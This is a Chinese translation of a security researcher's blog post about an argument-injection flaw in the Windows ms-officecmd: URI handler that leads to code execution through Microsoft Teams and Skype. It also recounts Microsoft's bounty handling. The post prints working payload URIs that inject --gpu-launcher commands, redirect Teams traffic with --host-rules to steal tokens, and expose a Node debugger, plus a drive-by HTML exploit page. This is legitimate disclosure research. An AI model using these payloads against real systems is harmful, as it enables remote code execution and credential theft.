**译者：知道创宇404实验室翻译组  
原文链接：<https://positive.security/blog/ms-officecmd-rce#teams-drive-by-exploit-for-ie11edge-legacy-via---gpu-launcher-command-injection>**

![img](https://images.seebug.org/content/images/2021/12/13/1639364831000-1kticz.png-w331s)

## 摘要

  * 我们通过IE11/Edge Legacy和MS Teams在Windows 10上发现了一个驱动代码执行漏洞，该漏洞由Windows 10/11默认处理程序中`MS -officecmd:` URI的参数注入触发。
  * 通过其他浏览器进行攻击，受害者需要接受一个不显眼的确认对话框。或者，通过执行不安全URL处理的[桌面应用程序](https://positive.security/blog/url-open-rce)，恶意URI也可以传递。
  * 微软漏洞赏金计划 (MSRC) 响应不及时:起初，他们判断错误，并且完全忽略了这个问题。在我们反映后，该问题被归类为“关键，RCE”，但对其进行了分类的悬赏广告只获得了十分之一的奖励（5千美元与5万美元的差距）。他们在5个月后提交的补丁未能正确解决基本参数注入（目前在Windows 11上仍然存在）。 
  * 我们的研究过程很简单：我们决定两周内在默认的Windows10 URI处理程序中发现一个代码执行漏洞。考虑到Windows附带的URI处理程序的数量，很可能其他处理程序也可以找到漏洞。

* * *

## 开发/演示

代码执行是由一个恶意网站触发的，该网站执行Javascript重定向到一个定制的`ms-officecmd:`URI(微软Office
UWP应用程序用来启动其他Office桌面应用程序的方案)。我们利用URI处理程序中的一个参数注入漏洞，绕过Electron中的一个安全措施，通过Microsoft
Teams Electron应用程序的`——gpu-launcher`参数注入一个任意的操作系统命令。

通过MS Edge在Windows 10上驱动RCE

这是在上面的视频中使用的`ms-officecmd:`URI(为了可读性，使用JSON缩进):

    
    
    ms-officecmd:{
       "LocalProviders.LaunchOfficeAppForResult": {
           "details": {
               "appId": 5,
               "name": "irrelevant",
               "discovered": {
                   "command": "irrelevant"
               }
           },
           "filename": "a:/b/ --disable-gpu-sandbox --gpu-launcher=\"C:\\Windows\\System32\\cmd /c ping 2016843009 && \""
       }
    }

除Internet Explorer和Microsoft Edge Legacy之外的浏览器在打开恶意URI之前会显示一个很不显眼的确认对话框:

![img](https://images.seebug.org/content/images/2021/12/13/1639364833000-2pfccq.png-w331s)
不同的浏览器显示出的确认对话框

作为通过恶意网站进行攻击的替代方案，精心设计的`ms-officecmd:`URI也可以通过执行不安全URL处理的[桌面应用程序](https://positive.security/blog/url-open-rce)传递。

这种特殊方法的先决条件是安装Microsoft Teams但不运行。在下面环节中，我们还将展示在MS Teams的帮助下和没有MS
Teams的帮助下，scheme和参数注入如何以其他方式来使用。

注意:虽然Windows 11在研究的时候还没有发布，但它也(仍然)受到相同的参数注入漏洞`ms-officecmd:`URI处理程序的影响。

* * *

## ToC / 研究过程

![](https://images.seebug.org/content/images/2021/12/2ef1c3c5-ccf4-4126-8afe-3f907ccf59cc.png-w331s)

### 动机:改进恶意URI攻击场景

在2021年1月，我们花了一些时间分析流行的桌面应用程序如何处理用户提供的URI，发现了其中大多数都存在代码执行漏洞。关于我们报告的详细文章可以在[我们2021年4月的文章](https://positive.security/blog/url-open-rce)中找到。

为了展示我们在Windows上的发现，我们主要利用了与内容相关的架构(`nfs`， `dav`，
`file`，…)，以及托管在互联网可访问的文件共享上的可执行文件/jar文件。关于这些有效负载，一定要注意，它们要么需要安装Java，要么需要一个对话框来运行待确认的可执行文件。

在此过程中，我们还发现了一个[WinSCP的URI处理中的代码执行漏洞](https://positive.security/blog/url-open-rce#bonus-vulnerability-winscp)。WinSCP实际上是在Windows上处理各种URI方案的标准，但它并没有预装在操作系统中。

第三方URI处理程序的漏洞并不新鲜，之前的例子也有很多:

  * [Code execution in the `steam:` URI handler (2012)](https://revuln.com/files/ReVuln_Steam_Browser_Protocol_Insecurity.pdf)
  * [Code execution affecting Electron apps which register custom protocols (CVE-2018-1000006)](https://www.electronjs.org/blog/protocol-handler-fix)
  * [Code execution in the `teamviewer10:` URI Handler (CVE-2020-13699)](https://jeffs.sh/CVEs/CVE-2020-13699.txt)

我们希望进一步改进基于恶意URI的攻击场景，但要先在Windows预装的URI处理程序中找到一个代码执行漏洞。

### 在Windows 10中枚举URI处理程序

Windows 10提供了大量与不同操作系统特性或其他微软软件相关的自定义URI处理程序。

对于我们的目的，找到注册的URI处理程序有个非常方便的方法，就是在注册表中重复搜索'URL Protocol':

![img](https://images.seebug.org/content/images/2021/12/13/1639364834000-4nvdxk.png-w331s)
在Windows注册表中查找URI处理程序

`Computer\HKEY_CLASSES_ROOT\*`中的任何命中都意味着包含文件夹的名称与已注册URI处理程序的方案对应。注册表还包含关于每一项的更多信息，比如用于调用相应处理程序的shell命令。有一个非常简单和更实际的方法可以更好地了解这个方案是与什么相关，那就是在浏览器地址栏中输入它，后跟一个`:`，然后按enter:

通过Edge中的`calculator:`方案打开calc.exe

### `ms-officecmd:`因其复杂度而有趣

`ms-officecmd:`scheme立即引起了我们的注意，因为它有一个很有意思的名字：ms-Office是一套非常复杂的应用程序，有许多旧功能和多年的开发经验。最重要的是，该方案以“command”的缩写结尾，这意味着更具复杂性且有可能用于注射。

当我们开始使用它时，我们注意到一个名为`LocalBridge.exe`的可执行文件，它将短暂运行，但没有明显的外部影响。为了更深入地了解发生的情况，我们检查了Windows事件日志，其中包含一些非常有用的信息：

![img](https://images.seebug.org/content/images/2021/12/13/1639364835000-5yzdlv.png-w331s)
.NET JsonReaderException 由打开URI `ms-officecmd:invalid`触发

当打开一个由空的、有效的JSON有效负载`ms-officecmd:{}`组成的URI时，同样的异常不会发生，这暗示我们关于有效URI的结构是什么样子的。

观察URI处理程序中的JSON解析之后，我们最终确认了`ms-officecmd:`URI有潜力完成非常复杂的事情。

### 反编译 LocalBridge.exe 和 AppBridge.dll

为了更好地了解，我们决定从反编译`LocalBridge.exe`开始:

![img](https://images.seebug.org/content/images/2021/12/13/1639364835000-6mijzx.png-w331s)

`LocalBridge.exe`的反编译源:URI验证和`LaunchOfficeAppValidated`调用(dotPeek)

c#代码包含了关于有效JSON有效负载结构的更多信息。在它的帮助下，我们再次开始实验:

    
    
    ms-officecmd:{
       "LocalProviders.LaunchOfficeAppForResult": {
           "details": {
               "name": "Word"
           },
           "filename": "C:\\Windows\\System32\\calc.exe"
       }
    }

不幸的是，我们并没有在`LocalBridge.exe`身上有太多的发现。我们接着分析`AppBridge.dll`，它包含`LaunchOfficeAppValidated`方法，JSON有效负载最终传递给它:

![img](https://images.seebug.org/content/images/2021/12/13/1639364836000-7badbh.png-w331s)
`LocalBridge.exe`的反编译源:从`AppBridge.dll`导入(dotPeek)的`LaunchOfficeAppValidated`

我们通过分解原生的`AppBridge.dll`库，提取了更多潜在的JSON属性名，但如何使用它们还不是很清楚。

![img](https://images.seebug.org/content/images/2021/12/13/1639364837000-8zixlk.png-w331s)
`AppBridge.dll`: 相关的unicode字符串(来自Ghidra)

### 调试Office UWP应用程序（Electron PWA）

当`LocalBridge.exe/AppBridge.dll`的分析没有迅速产生预期的结果时，我们采用了一种不同的并行方法：我们可以尝试检查生成此类URI的应用程序，而不是剖析处理`ms
officecmd:`URI的应用程序。

虽然我们不知道哪些应用程序可以生成此类URI，但之前我们偶然发现了Office UWP应用程序，由于以下原因，该应用程序很可能成为候选应用程序：

  * 该应用程序可以通过自定义方案`ms officeapp:`打开，该方案与我们的研究目标`ms officecmd:`非常相似
  * 这个应用程序的行为几乎与 office365在 https://www.office.com/上的网页界面相同，同时它还允许打开一些无法从网页上打开的桌面应用程序

![img](https://images.seebug.org/content/images/2021/12/13/1639364838000-9bqyrh.png-w331s)
Office UWP应用程序预装在Windows 10上

直觉表明，每当Office UWP应用程序触发要打开的Office桌面应用程序时，都会在内部使用`ms
officecmd:`scheme。这一怀疑后来得到证实。

使用微软自己的“Edge DevTools Preview”应用程序，我们能够连接到该进程并调试Office UWP应用程序。

![img](https://images.seebug.org/content/images/2021/12/13/1639364839000-10bhnuk.png-w331s)
Microsoft Edge DevTools Preview (右) 提供 Office UWP app (左) 作为调试目标

得到我们想要的信息是迅速而简单的:

  1. 执行全局源代码搜索(`ctrl`\+ `shift`+`f`)来查找 scheme 关键字`ms-officecmd`: 唯一找到的是`launchProtocol`常量的定义
  2. 执行另一个搜索来查找`launchProtocol`常量的用法: 第一个命中在`launchViaProtocol`方法中找到，这看起来很有用
  3. 在`launchViaProtocol`中添加一个断点并尝试触发它: 点击左边栏上的 Outlook 图标即可
  4. 从局部变量中提取 JSON 有效负载结构

![img](https://images.seebug.org/content/images/2021/12/13/1639364840000-11yfrsx.png-w331s)
Office UWP应用程序:`launchProtocol`常量定义(Edge DevTools 预览)

![img](https://images.seebug.org/content/images/2021/12/13/1639364841000-12klyxj.png-w331s)
Office UWP应用程序:`ms-officecmd:` JSON有效负载提取本地变量`n` (Edge DevTools预览)

一个更快的恢复JSON有效负载的替代方案是使用 [Microsoft Sysinternals Process Monitor
tool](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)
来记录与`LocalBridge.exe`相关的`Process Create`事件:

![img](https://images.seebug.org/content/images/2021/12/13/1639364842000-13oqytr.png-w331s)
`ms-officecmd:` 进程监视器显示的JSON负载

### ms-officecmd: 基本的JSON负载结构

有了提取的JSON有效负载，我们终于能够通过`ms-officecmd:`URI打开Office桌面应用程序。具体来说，从Office
UWP应用程序中提取的有效负载可以用来打开Outlook:

    
    
    ms-officecmd:{
       "id": 3,
       "LocalProviders.LaunchOfficeAppForResult": {
           "details": {
               "appId": 8,
               "name": "Outlook",
               "discovered": {
                   "command": "c:\\program files\\microsoft office\\root\\office16\\outlook.exe"
               }
           },
           "filename": ""
       }
    }

在随后的测试中，很明显有两个属性可以被操纵，而且效果立即可见:

  * `appId`: 要打开的办公桌面应用程序
  * `filename`: 要在指定应用程序中打开的文件路径或URL

`name` 和 `command`属性被验证并以较低的优先级处理，而`id`属性似乎只用于遥测。

在一个安装了基本Office的设备上, 我们列举了以下 `appId` 映射:

  * `1`: Access
  * `2`: Excel
  * `5`: Teams
  * `6`: Skype for Business
  * `7`: OneDrive
  * `8`: Outlook
  * `10`: PowerPoint
  * `12`: Publisher
  * `14`: Word
  * `18`: OneNote
  * `21`: Skype

### Outlook 网络钓鱼问题

第一个值得注意的发现是，当在文件名属性中提供一个`http (s)` URL 时，Outlook 会在一个基于 ie11的嵌入式 webview
中呈现相应的网页，但没有说明该网页的来源，甚至没有说明所显示的内容来自外部网页。这种行为可以被用来发起迷惑度极高的网络钓鱼攻击，特别是因为
`mailto:`链接可以根据本地配置，可以打开用户的电子邮件程序:

Outlook窗口内显示的登录界面是攻击者控制的网页

### Outlook 代码执行问题

Outlook 的意外打开行为可能被滥用，以通过更多的用户交互来实现代码执行。虽然 Outlook
不允许使用‘`file://`url，但允许使用`c://` url
方案，后来将其视为本地路径的驱动器号。此外，我们还添加了尾随的`/`，它绕过了`AppBridge.dll`中的文件扩展检查，但在以后打开可执行文件时被忽略。

这个 PoC 要求用户确认一个额外的警告对话框，但是我们认为，在这个情境下，哪怕聪明的用户也会被误导，从而点击确定:

使用`ms-officecmd:`和 Outlook 进行用户交互的 RCE 攻击

以下是恶意网页链接被点击后的情况:

  1. 通过动态添加一个指向 exe(demo中一个重命名为`PuTTY`的可执行文件) 的 iframe，一个名为`outlook.exe`的恶意可执行文件被保存到受害者的下载文件夹
  2. 看似无害的`mailto:`link 目标被一个恶意的`ms-officecmd:`URI 替换，该 URI 引用其`filename`属性中下载的可执行文件(注意左下角的悬停链接预览)
  3. 用户确认`打开 LocalBridge?`对话框(没有明确的安全警告)
  4. 当 Outlook 启动时，它会显示一个关于打开可能不安全的超链接的警告对话框。用户确认打开了本地的 outlook.exe 文件。
  5. 执行下载的文件(弹出 PuTTY 窗口)

### `filename` 属性参数注入

上面显示的问题滥用了`filename`属性，它提供的值在 Outlook 应用程序的上下文中是不常用和处理不当的，但是在更抽象的`ms-officecmd:`URI 处理程序上下文中可能是完全有效的和符合预期的: 除了具有大量不同文件扩展名的本地文件路径之外，大多数 Office
应用程序允许通过 `http`url 直接打开托管在 web 上的文档，就像 SharePoint/OneDrive 中的文件一样。

我们的接着发现，通过攻击 URI
处理程序本身处理`filename`属性的方式可以进一步推进滥用的可能性。即使不完全了解`AppBridge.dll`的内部工作原理，也有一定信心假设，为了使用指定的参数打开指定的
Office 应用程序，URI 处理程序最终要么生成并执行 shell
命令，要么直接运行其可执行程序。无论如何，攻击者控制的`filename`属性需要作为 shell
命令的一部分或参数传递。当我们使用常见的命令和参数注入技术进行实验时，我们发现可以使用一个简单的"`"` `` "(双引号 + 空格)序列来打破文件名规范。

这个参数注入说明了核心的最重要的问题。在我们进入实际的开发之前，这里有一个视频展示了最基本的参数注入:

使用`filename`参数注入来注入`/q`开关:

注意，当打开第二个 URI 时，没有蓝色 splash (加载)屏幕

这是视频中使用的URI（需要转义引号才能不破坏JSON）：

    
    
    ms-officecmd:{
       "LocalProviders.LaunchOfficeAppForResult": {
           "details": {
               "appId": 14,
               "name": "Word",
               "discovered": {
                   "command": "irrelevant"
               }
           },
           "filename": "https://example.com/\" /q"
       }
    }

### 加载恶意Word/Excel加载项

在发现可以将参数注入Office应用程序的启动命令之后，我们的下一步自然是检查哪些类型的参数对我们可用。因为我们有[针对Microsoft
Office产品的有文档记录的命令行开关](https://support.microsoft.com/en-us/office/command-line-switches-for-microsoft-office-products-079164cd-4ef5-4178-b235-441737deb3a6)，与启动时加载外接程序有关的那些似乎最有可能使用。

我们尝试了以下外接程序类型：

  * `.dll` 和 `.wll` 文件
  * `VSTO` 插件
  * 'Office' (web) 插件

不幸的是，我们无法让应用程序在启动时正确加载我们制作的任何加载项。

![img](https://images.seebug.org/content/images/2021/12/13/1639364843000-14jlkhn.png-w331s)
试图使用`-l`开关加载 Word 外接程序失败

### Teams MITM, 使用`--host-rules`身份验证泄漏

虽然我们对以文档为中心的Office应用程序进行的参数注入实验没有产生任何现实世界的攻击者会感兴趣的发现，但还有另一组应用程序可以去研究：Microsoft
Teams 和 Skype基于Electron框架，因此配备了大量有用的[Electron
命令行参数](https://www.electronjs.org/docs/api/command-line-switches)和[Node.js命令行参数](https://nodejs.org/api/cli.html).

我们能够确认的第一个可能被滥用的参数是`--host-rules`。此参数可用于重新映射IP地址和主机名，从而将应用程序的所有相关网络流量定向到所选目标。使用新域作为映射目标时，只要为新域正确设置了TLS，就不会出现TLS错误。通过添加`--ignore
certificate errors`开关，甚至那个操作都可以省去。借助反向代理，甚至仅仅是侦听web服务器，攻击者可以提取发送到Microsoft
Teams后端服务的所有敏感信息，包括身份验证令牌和消息。还可以利用反向代理修改API响应，并向受害者模拟任何MS Team用户。

当我们试图设计一个有效载荷以注入这些参数时，我们必须克服另外两个障碍：

  1. 作为[关键CVE-2018-1000006的修复](https://www.electronjs.org/blog/protocol-handler-fix)，Electron更改了他们的命令行解析逻辑，以在URI之后删除其他参数。通过检查源代码，我们发现了一个[单字母URI方案的例外情况](https://github.com/electron/electron/blob/4b70ccde26c057a3376c52eb563431943ebc3be6/shell/app/command_line_args.cc#L18-L2)，它跳过对包含驱动器号的Windows文件路径（即`C:/`）的过滤。因此我们可以在伪`filename`前缀后面插入Electron参数，比如`a:/b/`，这适用于Electron和`AppBridge.dll`。

  2. MS团队有时会因为`AppBridge.dll`文件扩展名检查而不会为包含`.`（句点）的`filename`参数启动。在下面的视频中，通过转换目标IP地址`3.64.176.207`转换为其整数格式`54571215`绕过此检查。

使用注入的`--host rules`和`--ignore certificate errors`参数将MS团队https流量重定向到我们自己的服务器

请注意，在此演示视频中，请求未转发到Team的真实后端，导致连接错误。 这是视频中使用的URI：

    
    
    ms-officecmd:{
       "LocalProviders.LaunchOfficeAppForResult": {
           "details": {
               "appId": 5,
               "name": "irrelevant",
               "discovered": {
                   "command": "teams.exe",
                   "uri": "msteams"
               }
           },
           "filename": "a:/b/ --ignore-certificate-errors --host-rules=\"MAP * 54571215\""
       }
    }

### 使用`--inspect` 调试器从本地网络执行Teams/Skype代码

另一个有用的参数是Node.js`--inspect`参数，可用于调试Node.JSJavaScript环境。该参数指定了可用于连接调试器的网络接口和端口号。出于安全原因，只能通过本地默认接口`127.0.0.1`进行调试。在下面的视频中，我们通过`---inspect=“0.0.0.0:28966”`开关覆盖该设置，以便在端口28966上接受任何网络接口的调试器连接。一旦调试器被连接，我们就利用一个标准Node.js库来执行我们的命令：`require（“child_进程”）.exec（“<command>”）`

再次制作有效负载需要一些技巧：

  1. 考虑到Skype打开时处理`filename`参数的方式，因此在插入其他参数之前，需要在假文件名之后再添加一个`"`字符。
  2. 在指定侦听接口时，不接受IP地址整数格式，我们就不得不包含字符`.`。因此，这一次，我们通过在恶意的`filename`负载末尾添加字符`/`，绕过`AppBridge.dll`中的文件扩展名检查。

本地网络攻击通过单击VM内部的恶意链接来显示，并从主机系统将调试器连接到Skype进程。

这是视频中使用的URI：

    
    
    ms-officecmd:{
       "LocalProviders.LaunchOfficeAppForResult": {
           "details": {
               "appId": 21,
               "name": "irrelevant",
               "discovered": {
                   "command": "irrelevant"
               }
           },
           "filename": "a:/b/\" --inspect=\"0.0.0.0:28966\" /"
       }
    }

请注意，对于易受影响的设置，此攻击还可能与[DNS重新绑定](https://en.wikipedia.org/wiki/DNS_rebinding)等结合使用，或与（最近改进的）[NATSlipstreaming](https://github.com/samyk/slipstream)技术一起使用，从而借助浏览器实现RCE的技术，无需本地网络访问。

### Teams 借助`--inspect` 调试器和带有SOP 旁路MITM 执行代码

实际上，我们还没有确认这个潜在的漏洞是否有效，但无论如何，我们都想分享这个想法，因为我们发现它的设置很有趣。最终，我们从未试图利用它，因为在我们准备采取此处需要的复杂的设置之前，我们使用下一节中描述的方法实现了完全的RCE。

我们的想法是将上述部分中的`--host rules`和`--inspect`开关与`--disable web security`
Chromium开关结合起来，这将允许我们利用对Chromium Javascript上下文的控制来连接到节点。js调试器并执行任意命令：

我们的想法是将上述部分中的`--host rules`和`--inspect`开关与`--disable web security`
Chromium开关结合起来，这样我们就可以利用对Chromium Javascript上下文的控制来连接到 Node.js调试器并执行任意命令：

  1. MS team 是通过恶意网站发起的，注入以下参数:
  2. `--host-rules="MAP <ms_teams_resources_host><attacker_host>"`
  3. `--ignore-certificate-errors`
  4. `--inspect=1337`
  5. `--disable-web-security`
  6. 在启动期间，`<attacker\u host>`上的恶意反向代理或web服务器修改了组成Team UI的合法资源文件，以包含恶意Javascript负载，该负载将在嵌入Electron的Chromium浏览器上下文中执行。
  7. Electron Chromium浏览器中的恶意Javascript请求位于`http://127.0.0.1:1337/json/list`的Node.js调试器元数据终结点，检索调试器连接所需的`<random\u uuid>`。`--disable web security`开关应禁用[同源策略](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)，使响应对恶意Javascript上下文可见。
  8. 3.Electron Chromium浏览器中的恶意Javascript连接到调试端点，地址为`ws://127.0。0.1:1337/<random_uuid>`,用来控制Node.js进程并执行一个OS命令。

### Teams 通过`--gpu-launcher`命令注入执行代码

在开始编写报告之前，我们发现了最后一个问题，我们最终通过恶意的`ms
officecmd:`URI执行了任意代码。此PoC的先决条件是安装MSTeams，但不运行它。

我们的恶意负载基于[利用CVE-2018-1000006的漏洞](https://www.exploit-db.com/exploits/44357)，它利用`--gpu
launcher`参数注入任意命令，该命令在Electron应用程序启动时执行。要使该漏洞与我们的参数注入和MS Teams协同工作，我们需要：

  1. 使用1个字符的URI方案启动`filename`参数以传递`AppBridge.dll`验证，但也没有运行到CVE-2018-1000006的Electron修复程序中（Electron仍然允许在Windows文件名之后添加其他参数，如“C:”）

  2. 注入额外的 `--disable-gpu-sandbox` 参数

  3. 通过删去字符 `.` 或将 字符`/`附加到恶意的`filename`值,绕过`AppBridge.dll` 的文件扩展名检查

  4. 添加一个shell指令，该指令可用于在注入的命令末尾链接像`&&`这样的命令，以保留有效的语法

通过MS Edge和MS Teams 执行任意代码

有效负载如下所示：

    
    
    ms-officecmd:{
       "LocalProviders.LaunchOfficeAppForResult": {
           "details": {
               "appId": 5,
               "name": "irrelevant",
               "discovered": {
                   "command": "irrelevant"
               }
           },
           "filename": "a:/b/ --disable-gpu-sandbox --gpu-launcher=\"C:\\Windows\\System32\\cmd /c calc && \""
       }
    }

Skype预先安装在Windows
10上，通过在其启动命令中添加`---secondary`参数，可以并行启动多个Skype实例。因此，如果通过Skype应用程序发现有效负载可利用此问题进行攻击，则它应在默认Windows
10安装上生效，无需任何先决条件。我们试图为Skype找到有效的负载，但未成功。可能在Skype被发现易受[CVE-2018-1000006攻击](https://www.securityfocus.com/bid/102796)时对其采取了额外的安全措施.

### Teams 利用IE11/Edge遗留的漏洞进行驱动，借助`--gpu-launcher` 命令注入

此时，我们对我们的发现非常满意，并开始为微软编写bug报告。就在我们即将提交报告时，我们注意到MSRC报告流包含一个强制下拉选择，以指定报告的漏洞是否可以发在最新Windows版本的“Windows
Insider Dev
Channel”上。由于微软为此类问题提供了相当可观的5万美元奖金，并且我们设想尽职调查强制表单字段将提高我们报告的质量评级，因此我们很高兴从该发布渠道安装最新版本的Windows
10，并验证我们的漏洞利用也能在该渠道起效。

![img](https://images.seebug.org/content/images/2021/12/13/1639364844000-15hjxrv.png-w331s)
MSRC报告流程询问“是否在Windows Insider Dev渠道上发布？”

令我们惊讶的是，该漏洞不仅有效，而且通过简单地添加一些点击恶意链接的JavaScript，预装的Internet Explorer 11和“旧”版本的MS
Edge可能会任意用来触发代码执行，而无需浏览恶意网站以外的任何用户操作。由于我们最初的动机是改进以前的攻击场景，即桌面应用程序打开任意URI，因此我们没有过多考虑浏览器攻击，只是假设所有现代浏览器在处理诸如`ms
officecmd`之类的模糊scheme时都有一些有用的安全默认设置。然而这一假设是错误的，如MS Edge Legacy所示：

Windows 10借助MS Edge在上通过RCE驱动

这是上面视频中使用的有效载荷:

    
    
    <html>
    Exploit in progress <a id="l" href="ms-officecmd:{&quot;id&quot;:3,&quot;LocalProviders.LaunchOfficeAppForResult&quot;:{&quot;details&quot;:{&quot;appId&quot;:5,&quot;name&quot;:&quot;Teams&quot;,&quot;discovered&quot;:{&quot;command&quot;:&quot;teams.exe&quot;,&quot;uri&quot;:&quot;msteams&quot;}},&quot;filename&quot;:&quot;a:/b/%20--disable-gpu-sandbox%20--gpu-launcher=\&quot;C:\\Windows\\System32\\cmd%20\/c%20ping%2016843009%20&amp;&amp;%20\&quot;&quot;}}"></a>
    <script>document.getElementById("l").click(); </script>

有了这段视频，我们提交了报告。

* * *

## MSRC 回应

### 分类时缺乏技术上的理解

我们的初次报告在提交后一天因不适用而被错误地结束。

> […] 不幸的是，您的报告似乎依赖于社会工程来完成，这不符合安全漏洞的定义。[…]

只有在我们提出上诉后，该问题才重新开放，并被归类为“关键，RCE”。

### 不情愿的，缓慢的沟通

我们的第一封电子邮件在一周后才被回复。之后的任何沟通尝试通常会需要数周的等待，需要我们跟进。（见[时间表](https://positive.security/blog/ms-officecmd-rce#timeline)下）

### 补救不足

本文中描述的参数注入漏洞仍然存在于完全修补后的Windows
10和11系统上。5个月后发布的补丁似乎只照顾到了Teams和Skype。虽然它确实阻止了这里描述的RCE
POC的漏洞，但我们认为可能还有其他方法利用参数注入来实现代码执行。

在我们请微软注意这一点后，他们说他们已经准备了另一个补丁来解决这个参数注入问题，并允许我们另外发布这篇文章。在发布这篇博文时，我们仍然可以注入任意参数，并在修补后的Windows
10/11系统上执行Outlook钓鱼攻击。

### 与公众缺乏沟通

尚未指派CVE或发布任何咨询意见，以告知公众该风险，微软对此的解释如下：

> out through Windows
> Update.不幸的是，在本案例中，没有与报告相关的CVE或咨询。我们创建的大多数CVE都是为了向用户解释为什么Windows
> Update要发送某些修补程序，以及为什么应该安装它们。对网站的更改、通过Defender或通过商店下载通常不会以相同的方式关联CVE。在本案例中，修复程序不会通过Windows
> Update发出。

### 误导性悬赏广告

虽然他们为这份报告支付了5000美元，但MS宣传了他们的漏洞赏金计划基于某些标准，还设立了特别
_[攻击场景奖](https://www.microsoft.com/en-us/msrc/bounty-windows-insider-preview)_
。我们认为，我们的报告应符合第二种描述的场景，即“在很少或没有用户交互的情况下，未经验证和未经授权访问私人用户数据”，最高奖励为50000美元。

微软一定有人同意我们的观点，因为这份报告为我们赢得了180个 _[研究员认可计划](https://www.microsoft.com/en-us/msrc/researcher-recognition-program)_ 点数，我们的想法就是，这个点数是适用于“合格攻击场景”的60点再乘3倍。

当我们询问悬赏金额时，我们被提示提供一份PoC，该PoC不要求受害者确认额外的“此站点正在尝试打开LocalBridge”对话框：

>
> 至于第二种攻击场景（远程（假设没有事先执行）、演示的未经验证和未经授权访问私人用户数据（用户交互很少或没有），此场景不需要事先执行，而您案例中演示的信息泄漏需要交互才能执行代码。
> 如果您可以提供一个在不提示我们的产品的情况下产生RCE的示例，我们很乐意重新审查该案例，以帮助您获得可能的攻击场景赏金奖励。

我们遵从并回复了演示视频，其中显示了IE 11上的驱动漏洞，尽管：

  * 我们不认为“此站点正在尝试打开LocalBridge”对话框应取消第二个攻击场景中的问题，因为该场景明确允许很少的用户交互。
  * 我们的初始报告中已经包含了一个PoC视频，该视频显示了Edge浏览器上的驱动器利用漏洞攻击，而当时最新发布的Windows 10 insider Dev频道中是没有提示的。当时我们意识到，['Microsoft Edge Legacy'于2021-03-09被宣布为EOL](https://blogs.windows.com/msedgedev/2021/03/09/microsoft-edge-legacy-end-of-support/)，正好在我们于2021-03-10提交原始MSRC报告的前一天。

MS最终拒绝了对赏金金额的另外调整：

> […] 本案例仍在一般判断的范围内。只有Internet Explorer才能访问的漏洞不在我们今天的赏金计划的范围内[…]

这一说法令人惊讶，因为
[IE在2022-06-15年之前仍然“受支持”](https://blogs.windows.com/windowsexperience/2021/05/19/the-future-of-internet-explorer-on-windows-10-is-in-microsoft-edge/)。

### 时间线

`2021-03-10` 通过https://msrc.microsoft.com/首次披露 `2021-03-11`
微软关闭我们的初始报告，因为"[..] 你的报告似乎依赖于社会工程 [..]" `2021-03-11` 我们向上诉委员会提交第二份报告
`2021-03-17` 微软重开我们的原始报告 `2021-03-27` MS证实了报告的行为 `2021-04-07` 微软确认了5000美元的奖励
`2021-04-07` 我们询问悬赏金额 `2021-04-08` 我们获得180点数 `2021-04-26`
我们从2021-04-07开始跟进我们的电子邮件 `2021-05-17` 我们再次跟进 `2021-05-18`
MS要求我们“提供一个在没有提示自家产品的情况下导致RCE的示例” `2021-05-18` 我们用IE 11驱动 PoC视频回应 `2021-06-07`
我们从2021年5月18日开始跟进我们的电子邮件 `2021-06-24` 我们再次跟进 `2021-06-24`
MS拒绝对赏金进行调整，因为“只有Internet Explorer才能访问的漏洞不在我们赏金计划的范围内” `2021-08-31`
我们对现在“完整”的报告进行的重新测试表明，我们的RCE PoC 不再有效，但参数注入没有修补 `2021-08-31`
我们敦促微软参数论点注入，并给他们4周时间要求推迟这篇文章的计划发布日期 `2021-09-16` 微软表示，应该在未来几天内推出一个补丁来修正这一参数注入
`2021-12-07` 我们发表这篇博文

* * *

[1] https://support.microsoft.com/en-us/office/command-line-switches-for-microsoft-office-products-079164cd-4ef5-4178-b235-441737deb3a6

[2] https://www.electronjs.org/blog/protocol-handler-fix

[3] [https://github.com/electron/electron/blob/
master/shell/app/command_line_args.cc#L18-L20](https://github.com/electron/electron/blob/master/shell/app/command_line_args.cc#L18-L20)

[4] List of launchable applications: Access, Delve, Skype, Teams, Excel,
SkypeForBusiness, OfficeLens, OneNote, Outlook, Powerpoint, Project,
Publisher, Sway, Visio, Word, Office, Office Hub

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1784/>

